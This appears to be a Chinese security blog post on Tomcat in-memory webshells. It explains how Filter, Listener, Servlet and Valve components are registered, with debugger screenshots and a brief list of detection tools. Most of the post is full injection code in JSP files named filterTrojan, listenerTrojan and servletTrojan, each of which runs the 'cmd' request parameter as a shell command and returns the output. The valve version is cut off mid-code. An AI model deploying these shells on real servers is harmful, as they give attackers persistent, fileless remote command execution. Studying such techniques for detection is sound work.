---
title: "Tomcat内存马——Filter&Servlet&Listener&valve"
onlyTitle: true
date: 2022-12-12 13:05:36
categories:
- java
- 内存马
tags:
- Tomcat
- 内存马
top: true
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B841.png

---

# Tomcat内存马

基础知识：https://www.freebuf.com/articles/web/274466.html



内存马主要分为以下几类：

1. servlet-api类

- filter型
- servlet型

2. spring类

- 拦截器
- controller型

3. Java Instrumentation类

- agent型



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226192132015.png)

请求会经过filter到达servlet，动态创建fliter放在最前面，就会命令执行

## 动态注册fliter

具体新建servlet的过程：https://blog.csdn.net/gaoqingliang521/article/details/108677301

新建一个servlet:

```java
package org.example;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet("/servlet")
public class servlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException{
        resp.getWriter().write("hello servlet");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    }
}
```

配置tomcat：应用程序上下文表示http访问servlet的地址，这里就是localhost:8080/servlet

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226195245120.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226200309488.png)

自定义的filter:

```java
import javax.servlet.*;
import java.io.IOException;

public class filterDemo implements Filter {

    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("Filter 初始化创建");
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("执行过滤操作");
      
       filterChain.doFilter(servletRequest,servletResponse);
    }

    public void destroy() {}
}
```

修改web.xml，指定url-pattern为`/demo`，也就是访问http://localhost:8080/servlet/demo时触发filter，一直刷新一直触发

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

<filter>
    <filter-name>filterDemo</filter-name>
    <filter-class>org.example.filterDemo</filter-class>
</filter>

<filter-mapping>
    <filter-name>filterDemo</filter-name>
    <url-pattern>/demo</url-pattern>
</filter-mapping>

</web-app>
```

分析之前在项目结构->模块->依赖里导入tomcat/lib的包



> 如果可以把自己创建的FilterMap放在FilterMaps的最前面，urlpattern匹配到的时候，就能把恶意FilterConfig添加到FilterChain中，然后触发shell



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227153131060.png)

filterChain来自creatFilterChain

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227153326017.png)

**FilterDefs**：存放FilterDef的数组 ，**FilterDef** 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息

**FilterConfigs**：存放filterConfig的数组，在 **FilterConfig** 中主要存放 FilterDef 和 Filter对象等信息

**FilterMaps**：存放FilterMap的数组，在 **FilterMap** 中主要存放了 FilterName 和 对应的URLPattern

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227153646187.png)



## 容器组件

https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w

* servletContext和StandardContext的关系

Tomcat中ServletContext实现类为ApplicationContext。ApplicationContext实例中又包含了StandardContext实例，以此来获取操作Tomcat容器内部的一些信息，例如Servlet的注册等。



由于正常环境不能直接修改web.xml。但是可以通过反射生成恶意filterDefs、filterConfig、filterMaps，三个一起放入Context就起到了web.xml注册一样的效果



要实现filter型内存马，需要经过：

1. 创建恶意filter
2. 用filterDef对filter进行封装
3. 将filterDef添加到filterDefs跟filterConfigs中
4. 创建一个新的filterMap将URL跟filter进行绑定，并添加到filterMaps中

因为filter生效会有一个先后顺序，所以一般来讲我们还需要把我们的filter给移动到FilterChain的第一位去。

每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启。

在Tomcat 7.x以上才支持Servlet3，而java.servlet.DispatcherType类在servlet3才引入。所以filter型内存马需要Tomcat7以上

## 一、Filter内存马

### 1.获取context

servlet提供了request.getSession().getServletContext()获取servletContext

不过该方法直接获取到的是ApplicationContextFacade，它封装了ApplicationContext。然后ApplicationContext封装了StandardContext

> 表达式((RequestFacade)servletRequest).request.getSession().getServletContext()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227163112042.png)

因此调两次反射就能拿到StandardContext

```jsp
<%
    Field appContextField = ApplicationContextFacade.class.getDeclaredField("context");
    appContextField.setAccessible(true);
    Field standardContextField = ApplicationContext.class.getDeclaredField("context");
    standardContextField.setAccessible(true);

    ServletContext servletContext = request.getSession().getServletContext();
    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

%>

```

不过servlet环境的request实际上为RequestFacade对象，它的request属性存储了Request对象，Request对象的getContext能直接拿到Context

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227162536522.png)

```java
    Field requestField = request.getClass().getDeclaredField("request");
    requestField.setAccessible(true);
    Request request1 = (Request) requestField.get(request);
    StandardContext standardContext = (StandardContext) request1.getContext();

```

###  2.添加FilterDefs

FilterDef提供了setFilter来修改filter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227205553231.png)

然后用StandardContext#addFilterDef()来添加FilterDefs

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227205817618.png)



生成恶意filter:接收cmd作为参数，System.getProperty(os.name)获取系统变量，用来判定系统为Linux or windows。然后调用Runtime#exec()进行命令执行。

```java
Filter filter = new Filter() {
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
        if (request.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            response.getWriter().write(output);
            response.getWriter().flush();
        }
        chain.doFilter(request, response);
    }

};
FilterDef filterDef = new FilterDef();
filterDef.setFilter(filter);
filterDef.setFilterName("evilFilter");
filterDef.setFilterClass(filter.getClass().getName());
standardContext.addFilterDef(filterDef);
```
`Scanner(in).useDelimiter("\\A");`scannner读入所有输入，包括回车和换行符（默认读到空格停止，`\\A`表示以文本开头作为分隔符分割文本)

将output写入response，获取完参数将request和response作为回调参数调用doFilter。

重点在于setFilter修改filter，然后使用standardContext.addFilter()添加FilterDefs



### 3.filterConfig封装filterDefs，并添加到filterConfigs

利用反射获取filterConifigs，filterConfigs实际上是个hashmap，put进去就行了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227213830277.png)

前面说过了，standardContext实际上是ApplicationFilterConfigContext封装的。

利用ApplicationFilterConfigContext构造函数来封装filterfDefs，不过该构造函数无修饰符，为default（同包可用），使用反射

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227212217994.png)

```java
	Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

    Field filterConfigsField = StandardContext.class.getDeclaredField("filterConfigs");
    filterConfigsField.setAccessible(true);
    Map filterConfigs = (Map) filterConfigsField.get(standardContext);
    filterConfigs.put("evilFilter", filterConfig);

```

### 4.生成filterMap添加到filterMaps

filterMaps需要设置名称，pattern，dispatcher

这里的dispatcher需要设置为DispatcherType.REQUEST，该选项指定了filter过滤器根据DispatcherType的类型是否执行。这也是为什么需要tomcat7以上的原因

FilterMaps可以用两种方式添加map：addFilterMap 或者addFilterMapBefore()，后者可以将filter添加至最前面

```java
FilterMap filterMap = new FilterMap();
filterMap.addURLPattern("/*");
filterMap.setFilterName("evilFilter");
filterMap.setDispatcher(DispatcherType.REQUEST.name());
standardContext.addFilterMapBefore(filterMap);
```
将抽象类的方法补全就能用了

完整代码：

```jsp
// filterTrojan.jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
  Field appContextField = ApplicationContextFacade.class.getDeclaredField("context");
  appContextField.setAccessible(true);
  Field standardContextField = ApplicationContext.class.getDeclaredField("context");
  standardContextField.setAccessible(true);

  ServletContext servletContext = request.getSession().getServletContext();
  ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
  StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

  Filter filter = new Filter() {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
      
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
      if (request.getParameter("cmd") != null) {
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
          isLinux = false;
        }
        String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner s = new Scanner(in).useDelimiter("\\A");
        String output = s.hasNext() ? s.next() : "";
        response.getWriter().write(output);
        response.getWriter().flush();
      }
      chain.doFilter(request, response);
    }

    @Override
    public void destroy() {

    }

  };
  FilterDef filterDef = new FilterDef();
  filterDef.setFilter(filter);
  filterDef.setFilterName("evilFilter");
  filterDef.setFilterClass(filter.getClass().getName());
  standardContext.addFilterDef(filterDef);

  Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
  constructor.setAccessible(true);
  ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

  Field filterConfigsField = StandardContext.class.getDeclaredField("filterConfigs");
  filterConfigsField.setAccessible(true);
  Map filterConfigs = (Map) filterConfigsField.get(standardContext);
  filterConfigs.put("evilFilter", filterConfig);

  FilterMap filterMap = new FilterMap();
  filterMap.addURLPattern("/*");
  filterMap.setFilterName("evilFilter");
  filterMap.setDispatcher(DispatcherType.REQUEST.name());
  standardContext.addFilterMapBefore(filterMap);

  out.println("Inject done");
%>



```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215628922.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215641112.png)

而且不需要指定jsp路径，因为注册的filterMap的pattern为`/*`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215956900.png)



## 排查内存马

#### arthas

项目链接：https://github.com/alibaba/arthas

我们可以利用该项目来检测我们的内存马

```
java -jar arthas-boot.jar --telnet-port 9998 --http-port -1
```

这里也可以直接 `java -jar arthas-boot.jar`

#### copagent

项目链接：https://github.com/LandGrey/copagent

#### java-memshell-scanner

项目链接：https://github.com/c0ny1/java-memshell-scanner



## 二、Listener内存马

Listener用来监听对象创建、销毁、属性增删改，然后执行对应的操作。

在Tomcat中，Listener->Filter->Servlet依次执行。

Tomcat支持两种listener：`org.apache.catalina.LifecycleListener`和`Java.util.EvenListener`,前者一般不能使用

实现了EvenListener的ServletRequestListener可以监听Request请求的创建和销毁（这么好的类当然要拿来做内存马

### ServletRequestListener调用流程

* request创建时：在servlet doGet方法处打上断点分析，然后get访问webservlet

  ![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228134615308.png)

servlet启动时，在StandardHostValue#invoke()中对监听器进行检查

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228134738674.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228135848468.png)

其中context.fireRequestInitEvent调用getApplicationEventListeners方法获取全部Listener

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228140322433.png)

if判断有Listener并且为ServletRequestListener子类，就调用ServletRequestListener#requestInitialized()方法



* Request销毁：

在StandardHostValue#invoke()下面，调用fireRequestDistroyEvent()销毁

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228140857022.png)

实际上也就是getApplicationEventListeners方法获取全部Listener后，使用ServletRequestListener#requestDestroyed()方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228141004954.png)



由此可见生成Listener只需要经过两个方法，一个是requestInitialized()，一个是requestDestroyed()。这两个方法重写后效果是一样的

* 构建Listener内存马流程：生成恶意Listener，然后放入Context



### 1.获取context

上文已经介绍了如何获取context，一样的通过反射获取Request，然后获取StandardContext

```java
Field requestField = request.getClass().getDeclaredField("request");
requestField.setAccessible(true);
Request request1 = (Request) requestField.get(request);
StandardContext standardContext = (StandardContext) request1.getContext();
```

### 2.生成恶意Listener

getParameter进行命令执行的地方就不多说了。创建Listener需要执行ServletRequestListener#requestInitialized()，那就new一个ServletRequestListener类然后重写requestInitialized方法。

ServletRequestEvent提供了getServletRequest()方法获取request

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228143920730.png)

上面获取context过程中用到的request1为Request对象，封装了getter获取response

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228144502202.png)



```java
ServletRequestListener listener = new ServletRequestListener() {
        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            HttpServletResponse resp = request1.getResponse();
            if (req.getParameter("cmd") != null) {
                try {
                    boolean isLinux = true;
                    String osTyp = System.getProperty("os.name");
                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\A");
                    String out = s.hasNext()?s.next():"";
                    resp.getWriter().write(out);
                    resp.getWriter().flush();
                }catch (IOException ioe){
                    ioe.printStackTrace();
                }
            }
        }

```

### 3.添加Listener

反射获取的StandardContext有addApplicationEventListener()添加Listener

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228144911877.png)

```java
standardContext.addApplicationEventListener(listener);
```

注意这里request1需要用final修饰，不然在newServletRequestListener匿名内部类里无法使用，会报`Cannot refer to the non-final local variable request1 defined in an enclosing scope`错误

POC：

```java
// listenerTrojan.jsp
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Scanner" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
  Field requestField = request.getClass().getDeclaredField("request");
  requestField.setAccessible(true);
  final Request request1 = (Request) requestField.get(request);
  StandardContext standardContext = (StandardContext) request1.getContext();

  ServletRequestListener listener = new ServletRequestListener() {
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
      
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
      HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
      HttpServletResponse resp = request1.getResponse();
      if (req.getParameter("cmd") != null) {
        try {
          boolean isLinux = true;
          String osTyp = System.getProperty("os.name");
          if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
          }
          String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
          InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
          Scanner s = new Scanner(in).useDelimiter("\\A");
          String out = s.hasNext()?s.next():"";
          resp.getWriter().write(out);
          resp.getWriter().flush();
        }catch (IOException ioe){
          ioe.printStackTrace();
        }
      }
    }
  };
  standardContext.addApplicationEventListener(listener);
  out.println("inject done!");
  out.flush();
%>
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228161031927.png)



## 三、Servlet内存马

Servlet开始于Web容器启动，直到Web容器停止运行。要注入servlet，就需要开启动态添加Servlet，在Tomcat7以后才有addServlet()方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228164745479.png)



### Servlet生成与配置

#### Servlet注册

Context 负责管理 Wapper ，而 Wapper 又负责管理 Servlet 实例。

通过StandardContext.createWapper()创建Wapper对象。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228165443196.png)

创建好了Wapper，跟进一下Servlet配置流程，在 org.apache.catalina.core.StandardWapper#setServletClass() 下断点

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228170338418.png)

在ContextConfig#webconfig()处配置webconfig，根据web.xml配置context

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228170613977.png)

然后调用了configureContext()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228170844431.png)

configureContext()依次读取了 Filter、Listener、Servlet的配置及其映射

在Servlet部分createWrapper()、设置了启动优先级LoadOnStartUp以及servletName。这里loadOnStartup就是负责动态添加Servlet的函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228171737407.png)

然后设置了servletClass

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228171953290.png)

最后把wrapper 添加进context的child

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228172017882.png)

循环遍历完了所有servlets，接下来添加Servlet-Mapper，也就是web.xml中的`<servlet-mapping>`。循环addServletMappingDecoded将url和servlet类做映射

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228204837168.png)





总结一下servlet注册过程：

1. 调用StandardContext.createWrapper为servlet创建wrapper
2. 配置LoadOnStartup启动优先级
3. 配置ServletName
4. 配置ServletClass
5. addChild添加wrapper到Context
6. addServletMappingDecode添加映射



其实到这里就能模拟servlet注册构造内存马了

不过LoadOnStartup设置优先级，也就是动态添加servlet的过程还不清楚

#### wrapper装载

跟进到startInternal，发现在加载完Listener和Filter后，开始loadOnstartup

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228211713270.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228211738904.png)

findChildren()将所有Wrapper传入loadOnStartup()处理，loadOnStartup获取到所有Wrapperchild，并且getLoadOnstartup获取到servlet启动顺序，>=0的存放在wapper_list

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228212118310.png)

如果loadOnstartup<0，则不会被动态添加到容器。该属性对应了web.xml中的`<load-on-startup>`，该属性默认-1

循环装载wrapper

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228212926651.png)



装载过程总的一句话，LoadOnStartup>=0才行





### 1.获取context

```java
<%
	Field requestField = request.getClass().getDeclaredField("request");
    requestField.setAccessible(true);
    final Request request1 = (Request) requestField.get(request);
    StandardContext standardContext = (StandardContext) request1.getContext();

```

### 2.生成恶意servlet

ApplicationFilterChain#doFilter()会调用servlet.service()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228214354359.png)

service()方法实际上在HttpServlet.class中，提供了多种http方法，所以我们不仅可以在servlet中重写doGet、doPost等触发RCE，还能直接重写service

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228214839952.png)

```java
   HttpServlet servlet = new HttpServlet() {
        @Override
        protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            if (request.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }
        }
    };

```

### 3.生成wrapper，封装进context

createWrapper()创建wrapper，设置servletName，修改LoadOnStartup属性值，还有ServletClass指向类

```java
	Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName("servletTrojan");
    wrapper.setLoadOnStartup(1);
    wrapper.setServlet(servlet);
    wrapper.setServletClass(HttpServlet.class.getName());

	standardContext.addChild(wrapper);

```

### 4.添加映射

```java
standardContext.addServletMappingDecoded("/*", "servletTrojan");

```

完整代码：

```jsp
//servletTrojan.jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Wrapper" %>

<%
    Field requestField = request.getClass().getDeclaredField("request");
    requestField.setAccessible(true);
    final Request request1 = (Request) requestField.get(request);
    StandardContext standardContext = (StandardContext) request1.getContext();

    HttpServlet servlet = new HttpServlet() {
        @Override
        protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            if (request.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }
        }
    };

    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName("servletTrojan");
    wrapper.setLoadOnStartup(1);
    wrapper.setServlet(servlet);
    wrapper.setServletClass(HttpServlet.class.getName());

    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/*", "servletTrojan");

    out.println("inject done!");
    out.flush();
%>

```

> 测试的时候记得把上一个马删掉，以免冲突



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228215800071.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228215818947.png)



## 四、valve内存马

value是Tomcat中对Container组件进行的扩展。Container组件也就是前文一直提及的Tomcat四大容器

Tomcat由四大容器组成，分别是**Engine、Host、Context、Wrapper**。这四个组件是负责关系，存在包含关系。只包含一个引擎（Engine）：

>    Engine（引擎）：表示可运行的Catalina的servlet引擎实例，并且包含了servlet容器的核心功能。在一个服务中只能有一个引擎。同时，作为一个真正的容器，Engine元素之下可以包含一个或多个虚拟主机。它主要功能是将传入请求委托给适当的虚拟主机处理。如果根据名称没有找到可处理的虚拟主机，那么将根据默认的Host来判断该由哪个虚拟主机处理。    
>    Host （虚拟主机）：作用就是运行多个应用，它负责安装和展开这些应用，并且标识这个应用以便能够区分它们。它的子容器通常是 Context。一个虚拟主机下都可以部署一个或者多个Web App，每个Web App对应于一个Context，当Host获得一个请求时，将把该请求匹配到某个Context上，然后把该请求交给该Context来处理。主机组件类似于Apache中的虚拟主机，但在Tomcat中只支持基于FQDN(完全合格的主机名)的“虚拟主机”。Host主要用来解析web.xml。
    Context（上下文）：代表 Servlet 的 Context，它具备了 Servlet 运行的基本环境，它表示Web应用程序本身。Context 最重要的功能就是管理它里面的 Servlet 实例，一个Context代表一个Web应用，一个Web应用由一个或者多个Servlet实例组成。
    Wrapper（包装器）：代表一个 Servlet，它负责管理一个 Servlet，包括的 Servlet 的装载、初始化、执行以及资源回收。Wrapper 是最底层的容器，它没有子容器了，所以调用它的 addChild 将会报错。 

这四大组件都有自己的管道Pipeline。就像前文Filter和Servlet的实际处理请求的方法，都在Wrapper的管道Pipeline->Valve-ValveBase-StandardWrapperValve#invoke方法中调用

Pipeline就相当于拦截器链，具体看https://www.cnblogs.com/coldridgeValley/p/5816414.html

当请求到达`Engine`容器的时候，`Engine`并非是直接调用对应的`Host`去处理相关的请求，而是调用了自己的一个组件去处理，这个组件就叫做`pipeline`组件

valve接口

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228221503105.png)

valve的invoke方法将请求传入下一个valve。如果不调用下一个valve的invoke，那请求到此中断

在servlet调试时也能看到依次调用valve的过程：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229124851725.png)

`Valve`存放的方式并非统一存放在`Pipeline`中，而是像一个链表一个接着一个。

调用`getNext()`方法即可获取在这个`Pipeline`上的下个`Valve`实例

一般使用实现了valve接口的ValveBase类：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229123320805.png)

### valve的生成和配置

#### 1.新建valve

新建valve只需要继承ValveBase类并实现invoke方法，pipeline管道会依次执行valve的invoke

```java
public class EvilValve extends ValveBase{
    @Override
    public void invoke(Request request, Response response) {
        try{
            Runtime.getRuntime().exec("calc");
            this.getNext().invoke(request, response);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

#### 2.注册valve

**四大组件Engine/Host/Context/Wrapper都有自己的Pipeline**，在ContainerBase基类里定义了Pipeline:

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229124307546.png)

而StandardPipeline标准类里有addValve方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229124444164.png)

#### 3.调用valve

在CoyoteAdapter.service()获取了Pipeline的第一个Valve，并且调用了invoke

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229125043383.png)

这里的第一个valve就是StandardEngineValve

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229125227060.png)

跟进到StandardEngineValve#invoke，可以看到调用了下一个invoke，在左下角的调试框，也就是valve.invoke的调用顺序

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229125422446.png)



根据valve的生成和配置，模拟注册恶意valve：

1. 获取context
2. 从StandardContext反射获取StandardPipeline
3. 调用addValve添加恶意Valve



### 1. 获取context

```java
Field requestField = request.getClass().getDeclaredField("request");
    requestField.setAccessible(true);

    final Request request1 = (Request) requestField.get(request);
    StandardContext standardContext = (StandardContext) request1.getContext();
```

### 2. 反射获取StandardPipeline



```java
Field pipelineField = ContainerBase.class.getDeclaredField("pipeline");
    pipelineField.setAccessible(true);
    StandardPipeline standardPipeline1 = (StandardPipeline) pipelineField.get(standardContext);
```

### 3. 创建注册恶意valve并添加进standardPipeline

```java
 ValveBase valveBase = new ValveBase() {
        @Override
        public void invoke(Request request, Response response){
            try {
            	Runtime.getRuntime().exec("calc");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };

    standardPipeline1.addValve(valveBase);

```



为了使正常invoke能进行下去，恶意valve也应该调用下一个valve.invoke

```java
this.getNext().invoke(request, response);
```

完整代码：

```java
//valveTrojan.jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    Field requestField = request.getClass().getDeclaredField("request");
    requestField.setAccessible(true);

    final Request request1 = (Request) requestField.get(request);
    StandardContext standardContext = (StandardContext) request1.getContext();

    Field pipelineField = ContainerBase.class.getDeclaredField("pipeline");
    pipelineField.setAccessible(true);
    StandardPipeline standardPipeline1 = (StandardPipeline) pipelineField.get(standardContext);

    ValveBase valveBase = new ValveBase() {
        @Override
        public void invoke(Request request, Response response) throws ServletException,IOException {
            if (request.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
